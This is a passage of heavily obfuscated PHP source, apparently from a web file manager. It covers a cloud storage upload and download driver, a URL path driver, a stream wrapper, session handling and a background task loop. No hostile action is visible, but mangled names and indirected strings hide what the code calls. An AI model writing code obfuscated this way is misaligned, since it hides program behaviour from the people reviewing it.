10; $•¶ßïÔ = array($Êñ™•×[1586], $Êñ™•×[1587] . $ëì»ŒÆå, $Êñ™•×[1588], $Êñ™•×[1589] . $Š—Ï±ÔÕ); $ÜÑ¤şôô = $this->ussRequest($ºö€á‰¸, $Êñ™•×[259], !1, $•¶ßïÔ); if (!$ÜÑ¤şôô[$Êñ™•×[1307]]) { return !1; } $¯Î™Ù = $ÜÑ¤şôô[$Êñ™•×[1297]]; $¯ÑÆÖ›© = 0; $°â±¼İÕ = $¯Î™Ù[$Êñ™•×[1590]]; $”–À¾• = fopen($ëéÈşß˜, $Êñ™•×[1466]); if (!$”–À¾•) { return !1; } do { $´´ÍÂèç = $¯Î™Ù[$Êñ™•×[1591]]; fseek_64($”–À¾•, $¯ÑÆÖ›©); $ŸùÇá = fread($”–À¾•, $´´ÍÂèç); $õ­¨ßôÅ = 0; do { $õ­¨ßôÅ++; $¯Î™Ù = $this->uploadPart($ºö€á‰¸, $¯Î™Ù, $ŸùÇá); } while (!$¯Î™Ù && $õ­¨ßôÅ < 3); if (!$¯Î™Ù) { return !1; } $°â±¼İÕ = $¯Î™Ù[$Êñ™•×[1590]]; $¯ÑÆÖ›© += $´´ÍÂèç; } while ($°â±¼İÕ != -1); fclose($”–À¾•); $•¶ßïÔ = array($Êñ™•×[1592], $Êñ™•×[1593] . $¯Î™Ù[$Êñ™•×[1594]], $Êñ™•×[1588]); $ÜÑ¤şôô = $this->ussRequest($ºö€á‰¸, $Êñ™•×[259], !1, $•¶ßïÔ); return $ÜÑ¤şôô[$Êñ™•×[1307]] ? $this->getPathOuter($™ÁŞ÷à) : !1; } private function uploadPart($ËÃ³Ñ, $–ô—»¡Ë, &$Óíâöª) { $‘¼„ÜÑ =& $_SERVER[§Êá¸İ]; $¾Õá¡¡Ù = array($‘¼„ÜÑ[1595], $‘¼„ÜÑ[1593] . $–ô—»¡Ë[$‘¼„ÜÑ[1594]], $‘¼„ÜÑ[1596] . $–ô—»¡Ë[$‘¼„ÜÑ[1590]], $‘¼„ÜÑ[146] . $–ô—»¡Ë[$‘¼„ÜÑ[1591]]); $‡–óÕÛ = $this->ussRequest($ËÃ³Ñ, $‘¼„ÜÑ[259], $Óíâöª, $¾Õá¡¡Ù); return !$‡–óÕÛ[$‘¼„ÜÑ[1307]] ? $‡–óÕÛ[$‘¼„ÜÑ[1307]] : $‡–óÕÛ[$‘¼„ÜÑ[1297]]; } public function uploadFormData($­¯†‹åº, $ÈşáõÌ½ = 3600) { return $this->uploadPolicy($­¯†‹åº, $ÈşáõÌ½); } public function multiUploadFormData($‡—Ïæ²Õ, $ËŞô·÷„ = 3600) { $°‹ğşñæ =& $_SERVER[§Êá¸İ]; $¨ºà¸‰ = (int) $GLOBALS[$°‹ğşñæ[7]][$°‹ğşñæ[79]]; return $this->uploadPolicy($‡—Ïæ²Õ, $ËŞô·÷„, $¨ºà¸‰); } private function uploadPolicy($§òç²¡õ, $ğâİĞ¯ = 3600, $Œ³»©¿© = 0) { $®Öâú£ =& $_SERVER[§Êá¸İ]; $ĞØÑß©â = $®Öâú£[8] . $this->bucket; $š€›‚¼• = gmdate($®Öâú£[1501]); $êºú¢û = array($®Öâú£[1597] => $this->bucket, $®Öâú£[1598] => $§òç²¡õ, $®Öâú£[1599] => time() + $ğâİĞ¯, $®Öâú£[1600] => $š€›‚¼•); if ($Œ³»©¿©) { $êºú¢û[$®Öâú£[1486]] = $Œ³»©¿©; } $Ï×çö = base64_encode(json_encode($êºú¢û)); $îØÁğ‚õ = base64_encode(hash_hmac($®Öâú£[1554], "\x50\117\123\124\46{$ĞØÑß©â}\x26{$š€›‚¼•}\x26{$Ï×çö}", md5("{$this->userpass}"), !0)); $±ãÄêÄ€ = array($®Öâú£[293] => $Ï×çö, $®Öâú£[1601] => "\x55\120\131\x55\x4e\40{$this->username}\72{$îØÁğ‚õ}", $®Öâú£[208] => $this->endpoint . $ĞØÑß©â); return $±ãÄêÄ€; } public function download($ÈÉÎÛùŒ, $Ğöó´˜³) { $‚Â¹ƒ¾Ÿ = IO::getPathInner(IO::mkfile($Ğöó´˜³)); if (!($°ø¦î = $this->link($ÈÉÎÛùŒ))) { return !1; } $Ò¸ìÚğİ = 0; $å“àåÓª = 1024 * 200; $‹ÈıµãÈ = fopen($‚Â¹ƒ¾Ÿ, $_SERVER[§Êá¸İ][1549]); while (!0) { $åœ’ã = $this->fileSubstr($ÈÉÎÛùŒ, $Ò¸ìÚğİ, $å“àåÓª); if ($åœ’ã === !1) { return !1; } fwrite($‹ÈıµãÈ, $åœ’ã); $Ò¸ìÚğİ += $å“àåÓª; if (strlen($åœ’ã) < $å“àåÓª) { break; } } fclose($‹ÈıµãÈ); return $Ğöó´˜³; } public function link($·±´¿Ùï, $·ÛñíÁ¯ = array()) { $™Õ¨×ı =& $_SERVER[§Êá¸İ]; $·±´¿Ùï = trim($·±´¿Ùï, $™Õ¨×ı[8]); if (!empty($this->token)) { $ËÊÕ­›ş = strtotime(date($™Õ¨×ı[1602])); $ëÔµæ·Ù = substr(md5($this->token . $™Õ¨×ı[360] . $ËÊÕ­›ş . $™Õ¨×ı[1603] . $·±´¿Ùï), 12, 8) . $ËÊÕ­›ş; $·ÛñíÁ¯[] = $™Õ¨×ı[1604] . $ëÔµæ·Ù; } $œ„”¡Æ« = !empty($·ÛñíÁ¯) ? $™Õ¨×ı[76] . implode($™Õ¨×ı[360], $·ÛñíÁ¯) : $™Õ¨×ı[12]; return $this->getHost() . $™Õ¨×ı[8] . $·±´¿Ùï . $œ„”¡Æ«; } public function fileOut($¤ÏÄ™€›, $òõ¨°…ò = false, $ĞßÒÓ‡ = false, $ØŠÒÍÕ‚ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¤ÏÄ™€›, $òõ¨°…ò, $ĞßÒÓ‡, $ØŠÒÍÕ‚); } if (!$ĞßÒÓ‡) { $ĞßÒÓ‡ = $this->pathThis($¤ÏÄ™€›); } $‹íÓèğö = $òõ¨°…ò ? array($_SERVER[§Êá¸İ][1605] . rawurlencode($ĞßÒÓ‡)) : array(); $Ô»÷èš‘ = $this->link($¤ÏÄ™€›, $‹íÓèğö); $this->fileOutLink($Ô»÷èš‘); } public function fileOutServer($ï­Â–Ü, $¬å“á‚ = false, $ñÄ£Ôú = false, $¬ƒÃŞÇ’ = '') { parent::fileOut($ï­Â–Ü, $¬å“á‚, $ñÄ£Ôú, $¬ƒÃŞÇ’); } public function fileOutImage($ıƒ¾Óì£, $‹ÄâÉÏ = 250) { $Úƒçğìà = $this->link($ıƒ¾Óì£ . $_SERVER[§Êá¸İ][1606] . $‹ÄâÉÏ); $this->fileOutLink($Úƒçğìà); } public function fileOutImageServer($Ö¥ëİóõ, $ÑÈâ›Ñé = 250) { parent::fileOutImage($Ö¥ëİóõ, $ÑÈâ›Ñé); } public function hashMd5($Â—÷•ùß) { $‹‡ä‚ƒ¥ =& $_SERVER[§Êá¸İ]; $ŸÈõëçÚ = $this->_objectMeta($Â—÷•ùß); return isset($ŸÈõëçÚ[$‹‡ä‚ƒ¥[245]]) ? $ŸÈõëçÚ[$‹‡ä‚ƒ¥[245]] : !1; } public function size($ÖÁùÓ×) { $“´ü¬÷± = $this->objectMeta($ÖÁùÓ×); return $“´ü¬÷± ? $“´ü¬÷±[$_SERVER[§Êá¸İ][79]] : 0; } public function info($í±üšÉ) { if ($this->isFolder($í±üšÉ)) { return $this->folderInfo($í±üšÉ); } else { if ($this->isFile($í±üšÉ)) { return $this->fileInfo($í±üšÉ); } } return !1; } public function exist($¨¤¯İÁ) { return $this->isFile($¨¤¯İÁ) || $this->isFolder($¨¤¯İÁ); } public function isFile($òÓñöë) { return !$this->isFolder($òÓñöë) && $this->objectMeta($òÓñöë); } public function isFolder($ªÉÑ‹Û“) { return $this->cacheMethod($_SERVER[§Êá¸İ][179], $ªÉÑ‹Û“); } protected function objectMeta($éäÎØœö) { return $this->cacheMethod($_SERVER[§Êá¸İ][181], $éäÎØœö); } protected function _objectMeta($ÎÂ™ÂÏ) { $´Ü›®§ =& $_SERVER[§Êá¸İ]; if ($ÎÂ™ÂÏ == $´Ü›®§[12] || $ÎÂ™ÂÏ == $´Ü›®§[8]) { return array(); } $›‡€ÅÇ­ = $this->ussRequest($ÎÂ™ÂÏ, $´Ü›®§[1607]); if (!$›‡€ÅÇ­[$´Ü›®§[1307]]) { return null; } $ÊÌÄØ‡ = isset($›‡€ÅÇ­[$´Ü›®§[1297]]) ? $›‡€ÅÇ­[$´Ü›®§[1297]] : array(); if (!isset($ÊÌÄØ‡[$´Ü›®§[1608]])) { return null; } $óŸ Á¹‚ = array($´Ü›®§[33] => isset($ÊÌÄØ‡[$´Ü›®§[1608]]) ? $ÊÌÄØ‡[$´Ü›®§[1608]] : null, $´Ü›®§[79] => isset($ÊÌÄØ‡[$´Ü›®§[1609]]) ? $ÊÌÄØ‡[$´Ü›®§[1609]] : null, $´Ü›®§[245] => isset($ÊÌÄØ‡[$´Ü›®§[1610]]) ? $ÊÌÄØ‡[$´Ü›®§[1610]] : null, $´Ü›®§[1577] => isset($ÊÌÄØ‡[$´Ü›®§[1611]]) ? $ÊÌÄØ‡[$´Ü›®§[1611]] : null); $óŸ Á¹‚[$´Ü›®§[1578]] = isset($ÊÌÄØ‡[$´Ü›®§[1612]]) ? strtotime($ÊÌÄØ‡[$´Ü›®§[1612]]) : $óŸ Á¹‚[$´Ü›®§[1577]]; return $óŸ Á¹‚; } protected function _isFolder($—öù³Šƒ) { $ªË´¯±„ =& $_SERVER[§Êá¸İ]; if ($—öù³Šƒ == $ªË´¯±„[12] || $—öù³Šƒ == $ªË´¯±„[8]) { return !0; } $Î°ÍÀ”õ = $this->_objectMeta($—öù³Šƒ); return isset($Î°ÍÀ”õ[$ªË´¯±„[33]]) && $Î°ÍÀ”õ[$ªË´¯±„[33]] == $ªË´¯±„[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($æñ¨€æÔ = false) { } public function exist($³Î¢øè˜) { $±Üå±œª = $this->info($³Î¢øè˜); return $±Üå±œª[$_SERVER[§Êá¸İ][232]]; } public function isFile($é¾ìêÛ‘) { $‹ì€İó¹ = $this->info($é¾ìêÛ‘); return $‹ì€İó¹[$_SERVER[§Êá¸İ][232]]; } public function isFolder($¢Ëãµß) { return !1; } public function size($†€Øˆ˜) { $²µÆïÍ = $this->info($†€Øˆ˜); return $²µÆïÍ[$_SERVER[§Êá¸İ][79]]; } public function info($³ëÈŞó) { return $this->infoParse($³ëÈŞó); } public function infoAuth($¼÷íÕ‹) { return $this->infoParse($¼÷íÕ‹); } public function infoWithChildren($ıÔ£©˜·) { return $this->infoParse($ıÔ£©˜·); } public function infoFull($âêïŠ€™) { return $this->infoParse($âêïŠ€™); } private function infoParse($³®ëÈõˆ) { $ì™‰«Í¶ =& $_SERVER[§Êá¸İ]; $±àºš±ß = $this->header($³®ëÈõˆ); if (!$±àºš±ß || !$±àºš±ß[$ì™‰«Í¶[837]]) { return !1; } $Ëá¿Ÿ¿² = _get($±àºš±ß, $ì™‰«Í¶[413], 0); $é•™šÉ† = array($ì™‰«Í¶[32] => $±àºš±ß[$ì™‰«Í¶[32]], $ì™‰«Í¶[87] => $³®ëÈõˆ, $ì™‰«Í¶[33] => $ì™‰«Í¶[230], $ì™‰«Í¶[79] => intval($Ëá¿Ÿ¿²), $ì™‰«Í¶[169] => get_path_ext($±àºš±ß[$ì™‰«Í¶[32]]), $ì™‰«Í¶[1463] => $Ëá¿Ÿ¿² > 0 && $±àºš±ß[$ì™‰«Í¶[1613]], $ì™‰«Í¶[1464] => !1); return $é•™šÉ†; } private function header($’…ˆ¤â) { $ğÊëıœİ =& $_SERVER[§Êá¸İ]; if (isset(self::$_cacheHeader[$’…ˆ¤â])) { return self::$_cacheHeader[$’…ˆ¤â]; } $°Û–…èù = isset($GLOBALS[$ğÊëıœİ[1614]]) ? $GLOBALS[$ğÊëıœİ[1614]] : !1; $GLOBALS[$ğÊëıœİ[1614]] = !0; self::$_cacheHeader[$’…ˆ¤â] = url_header($’…ˆ¤â); $GLOBALS[$ğÊëıœİ[1614]] = $°Û–…èù; return self::$_cacheHeader[$’…ˆ¤â]; } public function hashSimple($ÅÒ®Ü±, $™¦É¯´ = false) { $øøëœãÏ =& $_SERVER[§Êá¸İ]; $ıë»à™£ = $this->info($ÅÒ®Ü±); if (!$ıë»à™£ || !$ıë»à™£[$øøëœãÏ[232]]) { return !1; } $­Ø¶ÑÚ› = $ıë»à™£[$øøëœãÏ[79]]; $¶µÃ¤·è = 200; $­Äå¯ôó = 50; if ($­Ø¶ÑÚ› <= $¶µÃ¤·è * $­Äå¯ôó) { return md5($this->fileSubstr($ÅÒ®Ü±, 0, $­Ø¶ÑÚ›)) . $­Ø¶ÑÚ›; } $«İôÕĞ… = intval($­Ø¶ÑÚ› / $­Äå¯ôó); $… ÕÜ”Æ = $øøëœãÏ[12]; $ş‚èÙî = timeFloat(); $‰›œŒ© = 15; for ($š´–õÉ’ = 0; $š´–õÉ’ < $­Äå¯ôó; $š´–õÉ’++) { if (timeFloat() - $ş‚èÙî > $‰›œŒ©) { return !1; } $­È‹ÓÈ˜ = $this->fileSubstr($ÅÒ®Ü±, $«İôÕĞ… * $š´–õÉ’, $¶µÃ¤·è); if (!$­È‹ÓÈ˜) { return !1; } $… ÕÜ”Æ .= $­È‹ÓÈ˜; } $… ÕÜ”Æ .= $this->fileSubstr($ÅÒ®Ü±, $­Ø¶ÑÚ› - $¶µÃ¤·è, $¶µÃ¤·è); return md5($… ÕÜ”Æ) . $­Ø¶ÑÚ›; } public function getContent($À‚Âè²°) { return $this->fileSubstr($À‚Âè²°); } public function fileSubstr($œÑµÄ½, $’ºå¿ª = 0, $ÁÙÓòîñ = -1) { $™‰û¶Ğ  =& $_SERVER[§Êá¸İ]; $ĞìëÒ›– = $this->info($œÑµÄ½); if (!$ĞìëÒ›– || !$ĞìëÒ›–[$™‰û¶Ğ [232]] && $ĞìëÒ›–[$™‰û¶Ğ [79]] > 1024 * 1024 * 10) { return !1; } if ($ÁÙÓòîñ === -1) { $ÁÙÓòîñ = $ĞìëÒ›–[$™‰û¶Ğ [79]]; } if ($ÁÙÓòîñ == 0) { return $™‰û¶Ğ [12]; } $®ËÄ¢²ù = array($™‰û¶Ğ [1615] . $’ºå¿ª . $™‰û¶Ğ [872] . ($’ºå¿ª + $ÁÙÓòîñ - 1)); $™í¥‚ˆ› = url_request($œÑµÄ½, $™‰û¶Ğ [261], !1, $®ËÄ¢²ù, !1, !1, 30); return $™í¥‚ˆ›[$™‰û¶Ğ [1297]] ? $™í¥‚ˆ›[$™‰û¶Ğ [1297]] : $™‰û¶Ğ [12]; } public function download($±³’®Á, $ïŞ·…Ş) { Downloader::start($±³’®Á, $ïŞ·…Ş); return $ïŞ·…Ş; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($êììœû, $äªÌ®ğë = '') { $this->info = $this->info($êììœû); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[§Êá¸İ][87]]; $this->pathOpen = $êììœû; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$êììœû])) { self::$_chunkBuffer[$êììœû] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($­…¹¤¥€) { $¢±ÄÉîÉ = $this->fileSubstr($this->pose, $­…¹¤¥€); $this->pose += strlen($¢±ÄÉîÉ); return $¢±ÄÉîÉ; } public function stream_tell() { return $this->pose; } public function stream_seek($×˜·‡Êõ, $Ûîè˜¥Ë) { $·Å¹Í =& $_SERVER[§Êá¸İ]; if ($Ûîè˜¥Ë == SEEK_SET) { $this->pose = $×˜·‡Êõ; } else { if ($Ûîè˜¥Ë == SEEK_CUR) { $this->pose += $×˜·‡Êõ; } else { if ($Ûîè˜¥Ë == SEEK_END) { $this->pose = $this->info[$·Å¹Í[79]] + intval($×˜·‡Êõ); } } } if ($×˜·‡Êõ < 0) { $this->pose = $this->info[$·Å¹Í[79]] + $×˜·‡Êõ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[§Êá¸İ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($™åÆ´º”, $†€™Ÿ²) { $šÂÆ·óí =& $_SERVER[§Êá¸İ]; $ºë«¸¨Ú = $this->info($™åÆ´º”); return array($šÂÆ·óí[1616] => 0, $šÂÆ·óí[1617] => 0, $šÂÆ·óí[16] => 32768 + 511, $šÂÆ·óí[1618] => 0, $šÂÆ·óí[1619] => 0, $šÂÆ·óí[1620] => 0, $šÂÆ·óí[1621] => 0, $šÂÆ·óí[79] => $ºë«¸¨Ú[$šÂÆ·óí[79]], $šÂÆ·óí[1622] => $ºë«¸¨Ú[$šÂÆ·óí[1462]], $šÂÆ·óí[1578] => $ºë«¸¨Ú[$šÂÆ·óí[88]], $šÂÆ·óí[1577] => $ºë«¸¨Ú[$šÂÆ·óí[231]], $šÂÆ·óí[1623] => 0, $šÂÆ·óí[1624] => 0); } static $fileInfo = array(); public function info($¬‹ë“áÕ) { $ûŸ­ªÛ = $_SERVER[§Êá¸İ][1625]; if (isset(self::$fileInfo[$¬‹ë“áÕ])) { return self::$fileInfo[$¬‹ë“áÕ]; } if (substr($¬‹ë“áÕ, 0, strlen($ûŸ­ªÛ)) != $ûŸ­ªÛ) { return !1; } self::$fileInfo[$¬‹ë“áÕ] = IO::info(substr($¬‹ë“áÕ, strlen($ûŸ­ªÛ))); return self::$fileInfo[$¬‹ë“áÕ]; } public static function read($ìÖ±ÑÍÈ, $úÇèÈ¨Ó, $êïƒ–Ñ) { if (!isset(self::$_fopenCache[$ìÖ±ÑÍÈ])) { $ëßÖŸí­ = new StreamWrapperIO(); $ëßÖŸí­->stream_open($ìÖ±ÑÍÈ); self::$_fopenCache[$ìÖ±ÑÍÈ] = $ëßÖŸí­; } $ëßÖŸí­ = self::$_fopenCache[$ìÖ±ÑÍÈ]; return $ëßÖŸí­->fileSubstr($úÇèÈ¨Ó, $êïƒ–Ñ); } public static function _read($ë¥´½, $ë ûÑ¦é, $¹ï•°«’) { $ÂÊñ”çì =& $_SERVER[§Êá¸İ]; $»¨ú•¢ú = fopen($ë¥´½, $ÂÊñ”çì[1466]); if (!$»¨ú•¢ú) { return $ÂÊñ”çì[12]; } $º“Á£Äş = 8192; fseek($»¨ú•¢ú, $ë ûÑ¦é, SEEK_SET); $Ëâ…ÜÔı = $ÂÊñ”çì[12]; $¹¢¨º = 0; while ($¹¢¨º < $¹ï•°«’) { $í§ú¥“È = min($º“Á£Äş, $¹ï•°«’ - $¹¢¨º); $Ëâ…ÜÔı .= fread($»¨ú•¢ú, $í§ú¥“È); $¹¢¨º += $í§ú¥“È; } fclose($»¨ú•¢ú); return $Ëâ…ÜÔı; } public function fileSubstr($ã”‹Ûü‚, $œª‰åú) { $­ÆÚÆı› =& $_SERVER[§Êá¸İ]; $À¤Ã¡”œ = $this->info[$­ÆÚÆı›[79]]; $Ê«•Á´” = $ã”‹Ûü‚; $±•ñ‚åÔ = $œª‰åú; if ($ã”‹Ûü‚ < 0) { $ã”‹Ûü‚ = $À¤Ã¡”œ + $ã”‹Ûü‚; } if ($œª‰åú === !1) { $œª‰åú = $À¤Ã¡”œ - $ã”‹Ûü‚; } if ($ã”‹Ûü‚ + $œª‰åú > $À¤Ã¡”œ) { $œª‰åú = $À¤Ã¡”œ - $ã”‹Ûü‚; } if ($œª‰åú <= 0) { return $­ÆÚÆı›[12]; } if ($ã”‹Ûü‚ < 0 || $ã”‹Ûü‚ >= $À¤Ã¡”œ || $œª‰åú <= 0 || $œª‰åú > 1024 * 1024 * 10) { throw new Exception("\151\157\106\151\154\145\122\x65\141\x64\40\145\x72\162\x6f\x72\41\40\163\164\141\162\164\x3d{$ã”‹Ûü‚}\73\x6c\x65\156\147\164\x68\x3d{$œª‰åú}\x3b\x20\x73\151\x7a\x65\x3d{$À¤Ã¡”œ}\73"); } $ú×æôßÀ = 64 * 1024; $Ñğ Ô°¦ =& self::$_chunkBuffer[$this->path]; if (!$Ñğ Ô°¦) { $Ñğ Ô°¦ = array(); } $ˆ—íÜ²ˆ = 0; $Ÿøá©æ… = 0; $öçÖ™ä½ = $­ÆÚÆı›[12]; foreach ($Ñğ Ô°¦ as $ˆ—íÜ²ˆ => $öçÖ™ä½) { $ˆ—íÜ²ˆ = intval($ˆ—íÜ²ˆ); $Ÿøá©æ… = $ˆ—íÜ²ˆ + strlen($öçÖ™ä½); if ($ã”‹Ûü‚ >= $Ÿøá©æ…) { continue; } if ($ã”‹Ûü‚ >= $ˆ—íÜ²ˆ && $ã”‹Ûü‚ + $œª‰åú <= $Ÿøá©æ…) { return substr($öçÖ™ä½, $ã”‹Ûü‚ - $ˆ—íÜ²ˆ, $œª‰åú); } break; } if (count($Ñğ Ô°¦) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($­ÆÚÆı›[1626], $­ÆÚÆı›[1627] . count($Ñğ Ô°¦) . "\x3b\x73\164\141\x72\x74\75{$ã”‹Ûü‚}\x2c\x6c\145\x6e\x67\x74\150\x3d{$œª‰åú}\73\x70\157\x73\x65\72{$ˆ—íÜ²ˆ}\x7e{$Ÿøá©æ…}"); throw new Exception($­ÆÚÆı›[1628]); } $î¥Ñ”¨Ì = intval($ã”‹Ûü‚ / $ú×æôßÀ) * $ú×æôßÀ; $æØéÒ‚ò = ceil(($ã”‹Ûü‚ + $œª‰åú) / $ú×æôßÀ) * $ú×æôßÀ - $î¥Ñ”¨Ì; $¿Û—µ““ = IO::fileSubstr($this->path, $î¥Ñ”¨Ì, $æØéÒ‚ò); $Ñğ Ô°¦[$î¥Ñ”¨Ì . $­ÆÚÆı›[12]] = $¿Û—µ““; ksort($Ñğ Ô°¦); $äÀ²”š = substr($¿Û—µ““, $ã”‹Ûü‚ - $î¥Ñ”¨Ì, $œª‰åú); return $äÀ²”š; } private function log($èğ•Ò¤Û, $¾¨òÓ¥) { $Úòœ™×ä =& $_SERVER[§Êá¸İ]; $†ë†¯÷õ = timeFloat() - $this->timeStart; write_log(sprintf($Úòœ™×ä[1629], $èğ•Ò¤Û, $this->info[$Úòœ™×ä[32]], $†ë†¯÷õ, $¾¨òÓ¥), $Úòœ™×ä[1274]); } } goto B¾„Ç‰Öğè; EËŠ¡ÑáÃ©: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ü¹¶ë˜ =& $_SERVER[§Êá¸İ]; static $±Øş€¶ = false; if ($±Øş€¶) { return $±Øş€¶; } $ºÒ²› = $GLOBALS[$Ü¹¶ë˜[6]][$Ü¹¶ë˜[425]]; self::$sessionTime = $ºÒ²›[$Ü¹¶ë˜[1725]]; $Ê·•íŠ› = isset($GLOBALS[$Ü¹¶ë˜[1726]]) ? $GLOBALS[$Ü¹¶ë˜[1726]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ê·•íŠ›)) { self::$sessionSign = Cookie::get($Ê·•íŠ›); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Ê·•íŠ›, self::$sessionSign, self::$sessionTime); $å‘ÎÎ½² = $ºÒ²›[$Ü¹¶ë˜[1727]]; $éÕ…‚Éü = $ºÒ²›[$å‘ÎÎ½²]; $õï¥ˆŞ = $ºÒ²›[$Ü¹¶ë˜[914]]; switch ($å‘ÎÎ½²) { case $Ü¹¶ë˜[21]: self::$handle = Model($Ü¹¶ë˜[915]); break; case $Ü¹¶ë˜[916]: self::$handle = new CacheRedis($éÕ…‚Éü, $õï¥ˆŞ); break; case $Ü¹¶ë˜[917]: self::$handle = new CacheMemcached($éÕ…‚Éü, $õï¥ˆŞ); break; case $Ü¹¶ë˜[230]: $éÕ…‚Éü[$Ü¹¶ë˜[87]] = $éÕ…‚Éü[$Ü¹¶ë˜[87]] . $Ü¹¶ë˜[1728]; self::$handle = new CacheFile($éÕ…‚Éü, $õï¥ˆŞ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $±Øş€¶ = new self(); return $±Øş€¶; } public static function getBySign($ŸŒÁ®‰Å) { $–Ü½Ôû = self::$handle->get($ŸŒÁ®‰Å); $–Ü½Ôû = unserialize($–Ü½Ôû); return is_array($–Ü½Ôû) ? $–Ü½Ôû : array(); } public static function setBySign($­±Ùñµß, $µ¤âßõ‘) { CacheLock::lock($­±Ùñµß); self::$handle->set($­±Ùñµß, serialize($µ¤âßõ‘), self::$sessionTime); CacheLock::unlock($­±Ùñµß); } public static function sign($²À…í¬ú = false) { if ($²À…í¬ú) { self::$sessionSign = $²À…í¬ú; } self::init(); return self::$sessionSign; } public static function set($—•üãÃÆ, $¶ºæÄò = false) { self::init(); if (is_array($—•üãÃÆ)) { foreach ($—•üãÃÆ as $•îóîª => $€Æ™úÊ¥) { array_set_value(self::$data, $•îóîª, $€Æ™úÊ¥); } } else { array_set_value(self::$data, $—•üãÃÆ, $¶ºæÄò); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ì¹ª™·¾ = false) { self::init(); if (!$ì¹ª™·¾) { return self::$data; } return array_get_value(self::$data, $ì¹ª™·¾); } public static function remove($õ´º†×¿) { self::init(); unset(self::$data[$õ´º†×¿]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[§Êá¸İ][920])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $®ªŒ€©Î =& $_SERVER[§Êá¸İ]; if (self::valueGet($®ªŒ€©Î[837]) != $®ªŒ€©Î[91]) { return; } if (self::valueGet($®ªŒ€©Î[1729]) == $®ªŒ€©Î[91]) { $Äõñ´€Ù = self::valueGet($®ªŒ€©Î[1730]); if (time() - $Äõñ´€Ù > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($®ªŒ€©Î[1729], $®ªŒ€©Î[91]); self::log($®ªŒ€©Î[1731] . ACTION . $®ªŒ€©Î[1732]); Hook::bind($®ªŒ€©Î[1733], $®ªŒ€©Î[1734]); $€ÔÌºåº = 0; while (!0) { self::cacheClear(); if (self::valueGet($®ªŒ€©Î[837]) != $®ªŒ€©Î[91]) { self::valueSet($®ªŒ€©Î[1729], $®ªŒ€©Î[228]); self::log($®ªŒ€©Î[1735]); die; } $Û„Ö·°û = time(); if ($Û„Ö·°û - $€ÔÌºåº >= 60) { self::valueSet(array($®ªŒ€©Î[1729] => $®ªŒ€©Î[91], $®ªŒ€©Î[1730] => $Û„Ö·°û)); $€ÔÌºåº = $Û„Ö·°û; } if (!file_exists(USER_SYSTEM . $®ªŒ€©Î[1736])) { self::valueSet(array($®ªŒ€©Î[1729] => $®ªŒ€©Î[228], $®ªŒ€©Î[837] => $®ªŒ€©Î[228])); self::log($®ªŒ€©Î[1737]); die; } $à¨í×“© = file_get_contents(BASIC_PATH . $®ªŒ€©Î[1738]); $è¤¯¸è÷ = KOD_VERSION . $®ªŒ€©Î[10] . KOD_VERSION_BUILD; $Ó¯Œ›¶ = match_text($à¨í×“©, $®ªŒ€©Î[1739]) . $®ªŒ€©Î[10] . match_text($à¨í×“©, $®ªŒ€©Î[1740]); if ($Ó¯Œ›¶ != $è¤¯¸è÷) { self::restart(); self::log("\x73\164\157\160\145\x64\x2e\133\166\x65\162\163\151\x6f\156\40\x75\x70\x64\x61\164\145\73{$versionNow}\x20\x3d\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¸İ½¹†ö =& $_SERVER[§Êá¸İ]; http_close(); $GLOBALS[$¸İ½¹†ö[1741]] = 1; $_SERVER[$¸İ½¹†ö[1742]] = $¸İ½¹†ö[1743]; $_COOKIE = array(); $GLOBALS[$¸İ½¹†ö[1744]] = 1; $GLOBALS[$¸İ½¹†ö[1745]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ˆûŠÓò =& $_SERVER[§Êá¸İ]; http_close(); self::valueSet($ˆûŠÓò[837], $ˆûŠÓò[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ˆûŠÓò[1729] => $ˆûŠÓò[228], $ˆûŠÓò[837] => $ˆûŠÓò[91])); self::log($ˆûŠÓò[1746]); } public static function taskSwitch() { $Í×şöÈÉ =& $_SERVER[§Êá¸İ]; $üãÅ‚Ïñ = self::valueGet($Í×şöÈÉ[837]) == $Í×şöÈÉ[91] ? $Í×şöÈÉ[228] : $Í×şöÈÉ[91]; self::valueSet($Í×şöÈÉ[837], $üãÅ‚Ïñ); } public static function shutdownEvent() { $±İË¹Åñ =& $_SERVER[§Êá¸İ]; self::valueSet($±İË¹Åñ[1729], $±İË¹Åñ[228]); self::log($±İË¹Åñ[1747]); } public static function config($ä²¥ä™†, $ÔûÓıÏ†) { self::valueSet($_SERVER[§Êá¸İ][837], $ä²¥ä™†); } private static function taskRunAll() { $Ü ±»‚Ÿ =& $_SERVER[§Êá¸İ]; $ıë‡ÖÜŞ = timeFloat(); $ú€–ü®‹ = Model($Ü ±»‚Ÿ[1748])->listData(); $ş¬¹£² = count($ú€–ü®‹); for ($›Úá¨ãÍ = 0; $›Úá¨ãÍ < $ş¬¹£²; $›Úá¨ãÍ++) { 